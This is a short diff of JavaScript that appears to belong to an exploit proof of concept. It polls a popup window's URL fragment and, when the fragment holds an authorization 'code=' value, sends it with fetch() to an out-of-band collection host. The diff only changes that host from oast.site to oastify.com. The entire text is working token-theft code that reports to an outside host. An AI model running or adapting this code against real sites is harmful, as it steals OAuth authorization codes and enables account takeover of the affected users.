@@ -10,7 +10,7 @@ for(let i=0;i<80;i++){
  try{
   let hash=win.location.hash;
   if(hash&&hash.includes("code=")){
-   fetch("https://j1m02evxjge7n0ae4ky76kviqu9mqupus.oast.site/?x="+encodeURIComponent(hash));
+   fetch("https://nh81fp0ydg1pns9kulz74shlwc23qtei.oastify.com/?x="+encodeURIComponent(hash));
    win.close();
    break;
   }
